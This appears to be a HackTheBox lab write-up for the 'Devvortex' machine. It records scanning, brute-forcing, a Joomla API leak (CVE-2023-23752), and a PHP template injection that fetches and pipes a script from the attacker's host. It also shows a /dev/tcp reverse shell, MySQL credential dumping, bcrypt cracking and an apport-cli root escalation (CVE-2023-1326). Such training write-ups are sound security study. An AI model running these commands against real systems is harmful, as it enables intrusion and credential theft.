---
title: Devvortex - CVE
date: 2025-12-07 00:00:00 +0000
categories: [HackTheBox Writeups]
tags: [hackthebox, linux]
---

```bash
ares@legion:~$ sudo nmap -sV -A -T4 $target
[sudo] password for ares: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-06 21:59 EET
Nmap scan report for 10.10.11.242 (10.10.11.242)
Host is up (0.038s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   37.62 ms 10.10.14.1 (10.10.14.1)
2   37.82 ms 10.10.11.242 (10.10.11.242)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.29 seconds

```bash
Fuzz for Subdomains:
```
ffuf -u 'http://devvortex.htb/' -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 100 -H 
"Host: FUZZ.devvortex.htb"

dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 8261ms]
:: Progress: [19966/19966] :: Job [1/1] :: 708 req/sec :: Duration: [0:00:08] :: Errors: 0 ::

```bash
Subdomain directory:
```bash
ares@legion:~/HackTheBox/Devvortex$ feroxbuster -u http://dev.devvortex.htb  -e -q -n --no-state -w /usr/share/seclists/Discovery/Web-Content/common.txt -o ferox_light.txt 

301      GET        7l       12w      178c http://dev.devvortex.htb/administrator => http://dev.devvortex.htb/administrator/
301      GET        7l       12w      178c http://dev.devvortex.htb/api => http://dev.devvortex.htb/api/

```bash
Hydra Brute-Force Admin login page:
```
ares@legion:~/HackTheBox/Devvortex$ hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt dev.devvortex.htb http-get /administrator -V -e nsr -f -t 50 -K
[ATTEMPT] target dev.devvortex.htb - login "info" - pass "bubbles" - 50 of 118993341292910 [child 49] (0/0)
[80][http-get] host: dev.devvortex.htb   login: info   password: info
[STATUS] attack finished for dev.devvortex.htb (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-06 22:37:00

```bash
Creds do not work.

Default path for joomla instances > Check version
http://dev.devvortex.htb/administrator/manifests/files/joomla.xml 
![20251106224547.png](/assets/img/htb-writeups/Pasted image 20251106224547.png)
![20251106224448.png](/assets/img/htb-writeups/Pasted image 20251106224448.png)

Vulnerable to:
https://www.exploit-db.com/exploits/51334
https://github.com/Acceis/exploit-CVE-2023-23752

```
curl http://dev.devvortex.htb/api/index.php/v1/config/application?public=true -vv

user":"lewis","id":224}},{"type":"application","id":"224","attributes":{"password":"P4ntherg0t1n5r3c0n##","id":224}
```bash
![20251106233255.png](/assets/img/htb-writeups/Pasted image 20251106233255.png)

Burp:
GET /api/index.php/v1/config/application?public=true
![20251106234500.png](/assets/img/htb-writeups/Pasted image 20251106234500.png)

System > Site Template > Cassiopea Files
![20251106234156.png](/assets/img/htb-writeups/Pasted image 20251106234156.png)

One-Liner Script to fetch via curl request:
```
<?php system("curl 10.10.14.30:8000/rev.sh|bash"); ?> // in error.php
```bash
echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.30/4444 0>&1' > rev.sh
```bash
curl -k "http://dev.devvortex.htb/templates/cassiopeia/error.php/error"
```bash
Start 8000 and 443 listeners. 
Tried other php rev shells but didn't work.

Manual enumaration notes for linux privesc > cat configuration.php has previous found creds > ss -tlpn shows sql port opened. 

```
mysql -u lewis -p
Enter password: P4ntherg0t1n5r3c0n##
show databases;
use joomla;
show tables
select * from sd4fg_users;
```bash
![20251107001915.png](/assets/img/htb-writeups/Pasted image 20251107001915.png)

Logan
```
hashid '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12'

Analyzing '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt
```bash
```bash
echo '$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u' > hash
hashcat --example-hashes | grep -B5 -A5 bcrypt
hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt 

$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho   
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy...tkIj12
Time.Started.....: Fri Nov  7 00:25:11 2025 (13 secs)
Time.Estimated...: Fri Nov  7 00:25:24 2025 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-72 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:      106 H/s (17.27ms) @ Accel:8 Loops:32 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1408/14344385 (0.01%)
Rejected.........: 0/1408 (0.00%)
Restore.Point....: 1344/14344385 (0.01%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:992-1024
Candidate.Engine.: Device Generator
Candidates.#01...: teacher -> tagged
Hardware.Mon.#01.: Temp: 48c Util: 93%

Started: Fri Nov  7 00:24:35 2025
Stopped: Fri Nov  7 00:25:26 2025

```bash
Privesc:
```
logan@devvortex:~$ sudo -l
sudo -l
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
    
logan@devvortex:~$ /usr/bin/apport-cli --version
/usr/bin/apport-cli --version
2.20.11
logan@devvortex:~$ 
```bash
Vulnerable to:
https://nvd.nist.gov/vuln/detail/CVE-2023-1326

guide:
https://0xd1eg0.medium.com/cve-2023-1326-poc-c8f2a59d0e00

```bash
sudo /usr/bin/apport-cli --file-bug

Select 8 > View Report > !/bin/bash
```bash


